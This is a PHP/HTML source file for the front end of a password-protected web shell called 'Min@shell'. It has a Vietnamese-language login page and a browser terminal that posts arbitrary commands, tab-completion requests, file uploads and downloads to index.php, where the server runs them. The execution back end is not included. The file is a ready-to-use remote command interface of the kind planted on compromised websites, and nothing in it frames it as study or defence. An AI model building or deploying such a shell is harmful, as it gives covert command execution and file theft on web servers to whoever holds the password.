<?php


if(!isset($_SESSION['dracural'])){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Waring! request is block</title>
        <meta charset="utf-8">
        <style>
            @import "bourbon";

@import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,700);
@import url(https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css);
@import url(https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css);

$shadow-color: #23203b;
$input-color: lighten(#AB9E95, 10%);
$input-border-color: #5E5165;
$button-background-color: #27AE60;

* {
  margin: 0;
  padding: 0;
}

html { 
  background: url(../src/asset/admin/images/shell.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

body {
  background: transparent;
}

body, input, button {
  font-family: 'Source Sans Pro', sans-serif;
}

@mixin normalize-input {
  display: block;
  width: auto;
  height: auto;
  border: none;
  outline: none;
  box-shadow: none;
  background: none;
  border-radius: 0px;
}

.login {
  padding: 15px;
  width: 400px;
  min-height: 400px;
  margin: 2% auto 0 auto;

  .heading {
    text-align: center;
    margin-top: 1%;

    h2 {
      font-size: 3em;
      font-weight: 300;
      color: rgba(255, 255, 255, 0.7);
      display: inline-block;
      padding-bottom: 5px;
      text-shadow: 1px 1px 3px $shadow-color;
    }
  }

  form {
    .input-group {
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      border-top: 1px solid rgba(255, 255, 255, 0.1);

      &:last-of-type {
        border-top: none;
      }

      span {
        background: transparent;
        min-width: 53px;
        border: none;

        i {
          font-size: 1.5em;
          color: rgba(255, 255, 255, 0.2);
        }
      }
    }

    input.form-control {
      @include normalize-input;

      padding: 10px;
      font-size: 1.6em;
      width: 100%;
      background: transparent;
      color: $input-color;

      &:focus {
        border: none;
      }
    }

    button {
      margin-top: 20px;
      background: $button-background-color;
      border: none;
      font-size: 1.6em;
      font-weight: 300;
      padding: 5px 0;
      width: 100%;
      border-radius: 3px;
      color: lighten($button-background-color, 40%);
      border-bottom: 4px solid darken($button-background-color, 10%);

      &:hover {
        background: tint($button-background-color, 4%);
        -webkit-animation: hop 1s;
        animation: hop 1s;
      }
    }
  }
}

.float {
  display: inline-block;
  -webkit-transition-duration: 0.3s;
  transition-duration: 0.3s;
  -webkit-transition-property: transform;
  transition-property: transform;
  -webkit-transform: translateZ(0);
  transform: translateZ(0);
  box-shadow: 0 0 1px rgba(0, 0, 0, 0);
  margin-top: 30px;
}

.float:hover, .float:focus, .float:active {
  -webkit-transform: translateY(-3px);
  transform: translateY(-3px);
}

/* Large Devices, Wide Screens */

@media only screen and (max-width : 1500px) {
}

@media only screen and (max-width : 1200px) {
  .login {
    width: 600px;
    font-size: 2em;
  }
}

@media only screen and (max-width : 1100px) {
  .login {
    margin-top: 2%;
    width: 600px;
    font-size: 1.7em;
  }
}

/* Medium Devices, Desktops */
@media only screen and (max-width : 992px) {
  .login {
    margin-top: 1%;
    width: 550px;
    font-size: 1.7em;
    min-height: 0;
  }
}

/* Small Devices, Tablets */
@media only screen and (max-width : 768px) {
  .login {
    margin-top: 0;
    width: 500px;
    font-size: 1.3em;
    min-height: 0;
  }
}

/* Extra Small Devices, Phones */ 
@media only screen and (max-width : 480px) {
  .login {

    h2 {
      margin-top: 0;
    }

    margin-top: 0;
    width: 400px;
    font-size: 1em;
    min-height: 0;
  }
}

/* Custom, iPhone Retina */ 
@media only screen and (max-width : 320px) {
  .login {
    margin-top: 0;
    width: 200px;
    font-size: 0.7em;
    min-height: 0;
  }
}

        </style>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    </head>
    <body>
    <div class="login">
  <div class="heading">
    <form action="#">


        <div class="row">
            
            <div class="input-group input-group-lg">
          <span class="input-group-addon"><i class="fa fa-lock"></i></span>
          <input type="password" id="pass" class="form-control" placeholder="Password">
       
            </div>

        </div>
        <div  id="load" style="color: white">
            
        </div>
        <button type="submit" class="btn btn-warning float text-center">Login</button>

        
       </form>
        </div>
        <script>
            $(document).ready(function(){
                $('.float').on('click',function(e){
                    e.preventDefault();
                     $("#load").html('<img src="https://www.drupal.org/files/issues/throbber_13.gif" width="30" height="30" /> Đang lấy thông tin đăng nhập...').fadeIn("slow");
                     $.ajax({
                        url : <?php PostRoute(); ?>,
                        method : 'POST',
                        data : {
                            key:'login-shell',
                            passShell: $('#pass').val(),
                        },
                        success:function(resp){
                            console.log('token = ',resp);
                            $("#load").html(' ');
                            if(resp == 1){
                                location.reload();
                            }else{
                                $("#load").html('Yêu cầu không hợp lệ!');
                            }
                        }
                     });
                });

            });
        </script>
 </div>
    </body>
    </html>
<?php

}else{



?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>Min@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
          @import url(https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css);
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }
            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }
            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }
            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }
            @media (max-width: 991px) {
                #shell-logo {
                    display: none;
                }
                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }
                #shell {
                    margin-top: 0;
                }
            }
            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }
            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }
            .shell-prompt > span {
                color: #1BC9E7;
            }
            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }
            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }
            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }
            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }
            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;
            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }
            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }
            function featureShell(command) {
                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("index.php", {cmd: command, cwd: CWD, feature: 'shell',key:'shell-exc'}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                }
            }
            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion
                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }
                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
                makeRequest(
                    "index.php",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type,
                        feature: 'hint',
                        key:'shell-exc'
                    },
                    _requestCallback
                );
            }
            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }
            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('index.php', {path: path, file: file, cwd: CWD, feature: 'upload',key:'shell-exc'}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }
            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }
            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "Min@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }
            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("index.php", {feature: 'pwd',key:'shell-exc'}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });
            }
            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }
            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }
            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }
            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }
            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
               
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                            console.log(xhr);
                        }
                    }
                };
                xhr.send(getQueryString());
            }
            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>

    <body>
      <div>
        <a href="index.php?route=[Tool][shell][logout]" ><i class="fa fa-power-off fa-2x"></i> logout</a>
      </div>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
                      ____      _          _ _        _  _   <span></span>
            __   __   / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
            | \./  | / / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
            |  __  |  | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
            | |  | | \ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
            | |  | |  \____/                                  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>

<?php } ?>